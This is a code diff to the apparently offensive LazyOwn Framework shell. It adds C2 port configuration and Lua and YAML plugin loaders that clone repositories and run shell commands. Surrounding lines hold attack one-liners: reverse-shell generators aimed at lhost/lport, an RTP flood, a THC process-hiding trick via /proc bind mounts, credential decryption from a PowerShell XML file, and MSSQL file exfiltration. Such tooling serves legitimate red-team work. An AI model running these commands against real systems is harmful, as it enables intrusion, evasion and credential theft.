@@ -33,7 +33,7 @@ with open('payload.json', 'r') as file:
     lhost = config.get("lhost")
     c2_user = config.get("c2_user")
     c2_pass = config.get("c2_pass")
-
+    c2_port = config.get("c2_port")
 class LazyOwnShell(cmd2.Cmd):
     """
     A custom interactive shell for the LazyOwn Framework.
@@ -92,7 +92,8 @@ class LazyOwnShell(cmd2.Cmd):
     rhost = config.rhost
     lhost = config.lhost
     lport = config.lport
-
+    c2_port = config.c2_port
+    
     aliases = {
         "available_filter_functions": "sh sudo cat /sys/kernel/tracing/available_filter_functions",
         "available_filter_functions_debug": "sh sudo cat /sys/debug/kernel/tracing/available_filter_functions",
@@ -153,6 +154,7 @@ class LazyOwnShell(cmd2.Cmd):
         "q": "exit",
         "qq": "run_script \"/home/grisun0/LazyOwn/lazyscripts/lazyquit.ls\"",
         "rtpflood" : "sh sudo bash modules/lazyrtpflood.sh",
+        "randomuser": "sh curl 'https://randomuser.me/api/' -H 'Accept: application/json' | jq",
         "rustrevmakerwin": f"sh cd sessions ; bash ../modules_ext/rustrevmaker/RustRevMaker.sh windows {lhost} {lport}",
         "rustrevmakerlin": f"sh cd sessions ; bash ../modules_ext/rustrevmaker/RustRevMaker.sh linux {lhost} {lport}",
         "t": "sh python3 modules/lazypyautogui.py",
@@ -206,6 +208,15 @@ class LazyOwnShell(cmd2.Cmd):
         )
         self.ip2asn = IP2ASN()
         #self.persistent_history_file = os.path.join(os.getcwd(), '/LazyOwn_history.txt')
+        self.plugins_dir = 'plugins'
+        self.lazyaddons_dir = 'lazyaddons'
+        self.lua = LuaRuntime(unpack_returned_tuples=True)
+        self.plugins = {}
+        self.register_lua_command = self._register_lua_command
+        self.lua.globals().register_command = self.register_lua_command
+        self.lua.globals().app = self
+        self.lua.globals().list_files_in_directory = self.list_files_in_directory
+        self.load_plugins()
         self.completekey = 'tab' 
         self.params = {
             "binary_name": "gzip",
@@ -295,7 +306,7 @@ class LazyOwnShell(cmd2.Cmd):
         ]
         self.output = ""
         self.custom_prompt = getprompt()
-        self.c2_url = "https://10.10.14.10:4444"
+        self.c2_url = f"https://{lhost}:{c2_port}"
         self.c2_auth = (c2_user, c2_pass)
         self.c2_clientid = "no_priv"
         self.path = os.getcwd()
@@ -453,6 +464,152 @@ class LazyOwnShell(cmd2.Cmd):
             You didn't enter any command.
         """        
         print_warn("You didn't enter any command.")
+
+    def list_files_in_directory(self, directory):
+        """Lista todos los archivos en un directorio dado."""
+        if not os.path.exists(directory):
+            return []  # Devuelve una lista vacía si el directorio no existe
+        return [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
+    
+    def _register_lua_command(self, command_name, lua_function):
+        """Registra un comando nuevo desde Lua."""
+        def wrapper(arg):
+            try:
+                # Llama a la función Lua y obtén el resultado
+                result = lua_function(arg)
+                if result is not None:
+                    print(result)  # Imprime el resultado si no es None
+            except Exception as e:
+                print(f"Error en el comando Lua {command_name}: {e}")
+        yaml_file = os.path.join(self.plugins_dir, f"{command_name}.yaml")
+        description = ""
+        
+        if os.path.exists(yaml_file):
+            try:
+                with open(yaml_file, 'r') as file:
+                    yaml_data = yaml.safe_load(file)
+                    description = yaml_data.get('description', "")
+            except Exception as e:
+                print_error(f"Error al leer YAML para {command_name}: {e}")
+
+        wrapper.__doc__ = description if description else f"Ejecuta el comando Lua '{command_name}'."
+        setattr(self, f'do_{command_name}', wrapper)
+        print_msg(f"Command '{command_name}' register from Lua.")
+
+    def load_plugins(self):
+        """Carga todos los plugins Lua desde el directorio 'plugins/'."""
+        plugins_dir = self.plugins_dir
+        if not os.path.exists(plugins_dir):
+            os.makedirs(plugins_dir)
+            print("Directorio de plugins creado.")
+            return
+
+        for filename in os.listdir(plugins_dir):
+            if filename.endswith('.lua'):
+                filepath = os.path.join(plugins_dir, filename)
+                yaml_ = filename.replace(".lua", ".yaml")
+                filepathyaml = os.path.join(plugins_dir, yaml_)
+                if filepathyaml == 'plugins/init_plugins.yaml':
+                    pass
+                else:
+                    try:
+                        with open(filepathyaml, 'r') as file:
+                            file_yaml = yaml.safe_load(file)
+                            enabled = file_yaml.get('enabled')
+                            if enabled:
+                                try:
+                                    with open(filepath, 'r') as file:
+                                        script = file.read()
+                                        self.lua.execute(script)
+                                except Exception as e:
+                                    print_error(f"Error al cargar el plugin '{filename}': {e}")
+                    except Exception as e:
+                        print_error(f"Error al cargar el yaml '{filepathyaml}': {e}")
+
+    def load_yaml_plugins(self):
+        """
+        Loads all YAML plugins from the 'lazyaddons/' directory.
+
+        This method scans the 'lazyaddons/' directory, reads each YAML file,
+        and registers enabled plugins as new commands.
+        """
+        if not os.path.exists(self.lazyaddons_dir):
+            os.makedirs(self.lazyaddons_dir)
+            print_warn("Lazyaddons directory created.")
+            return
+
+        for filename in os.listdir(self.lazyaddons_dir):
+            if filename.endswith('.yaml'):
+                filepath = os.path.join(self.lazyaddons_dir, filename)
+                try:
+                    with open(filepath, 'r') as file:
+                        plugin_data = yaml.safe_load(file)
+                        if plugin_data.get('enabled', False):
+                            self.register_yaml_plugin(plugin_data)
+                except Exception as e:
+                    print_error(f"Error loading YAML plugin '{filename}': {e}")
+
+    def register_yaml_plugin(self, plugin_data):
+        """
+        Registers a YAML plugin as a new command.
+
+        This method creates a dynamic command based on the plugin's configuration
+        and assigns it to the application.
+        """
+        tool = plugin_data.get('tool', {})
+        name = plugin_data['name']
+        params = plugin_data.get('params', [])
+        description = plugin_data.get('description', [])
+        execute_command = tool.get('execute_command', '')
+
+        def wrapper_yaml(arg):
+            try:
+
+                args = arg.split()
+                param_values = {}
+                
+                for param in params:
+                    param_name = param['name']
+
+                    if param.get('required', False) and param_name not in self.params:
+                        print_warn(f"Error: Parameter '{param_name}' is required but not found in self.params.")
+                        return
+
+                    if param_name in self.params:
+                        param_values[param_name] = self.params[param_name]
+                    elif 'default' in param:
+                        param_values[param_name] = param['default']
+                    else:
+                        print_warn(f"Error: Parameter '{param_name}' is missing and no default value is provided.")
+                        return
+
+                install_path = os.path.join(os.getcwd(), tool['install_path'])
+
+                if not os.path.exists(install_path):
+                    print_warn(f"{tool['name']} is not installed. Installing...")
+                    self.cmd(f"git clone {tool['repo_url']} {install_path}")
+                    if 'install_command' in tool:
+                        cmd = f"cd {install_path} && {tool['install_command']}"
+                        self.cmd(cmd)
+
+                try:
+
+                    command = execute_command.format(**param_values)
+                    command_replaced = replace_command_placeholders(command, self.params)
+               
+                    final_command = f"cd {install_path} && {command_replaced}"
+                except KeyError as e:
+                    print_error(f"Error: Missing parameter '{e}' in the plugin configuration.")
+                    return
+
+  
+                self.cmd(final_command)
+
+            except Exception as e:
+                print_error(f"Error in plugin '{name}': {e}")
+        wrapper_yaml.__doc__  = description
+        setattr(self, f'do_{name}', wrapper_yaml)
+        print_msg(f"Command '{name}' registered from YAML.")
 
     def do_EOF(self, line):
         """
@@ -5810,6 +5967,7 @@ class LazyOwnShell(cmd2.Cmd):
             ("Lin Hide pid as Root", "hide() { \n     [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; } \n     _pid=${1:-$$} \n     [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo \"[THC] PID $_pid is now hidden\"; return; } \n     local _argstr \n     for _x in \"${@:2}\"; do _argstr+=\" '${_x//\'/\'\"\'\"\'}'\"; done \n     [[ $(bash -c \"ps -o stat= -p \$\$\") =~ \+ ]] || exec bash -c \"mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr\" \n    bash -c \"mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr\" \n }"),
             ("LIN locate priv iot files", "powershell -c \"$credential = import-clixml -path C:\\Data\\Users\\app\\iot-admin.xml;$credential.GetNetworkCredential().password\""),
             ("LIN lsof LISTEN PORTS", "sudo lsof -i -P -n | grep LISTEN"),
+            ("LIN Screenshot", "xwd -root -out screenshot.xwd && convert screenshot.xwd screenshot.png"),
             ("SQL MSSQL exfiltrate files", "SELECT * FROM OPENROWSET(BULK N'C:\\users\\administrator\\desktop\\root.txt', SINGLE_CLOB) AS Contents"),
             ("WIN Enum App Lock Policy", "get-applockerpolicy -effective | select -expandproperty rulecollections"),
             ("WIN Enum Installer Policy", "reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated"),
@@ -24761,6 +24919,7 @@ class LazyOwnShell(cmd2.Cmd):
             
 if __name__ == "__main__":
     p = LazyOwnShell()
+    p.load_yaml_plugins()
     p.onecmd("check_update")
     p.onecmd("graph")
     
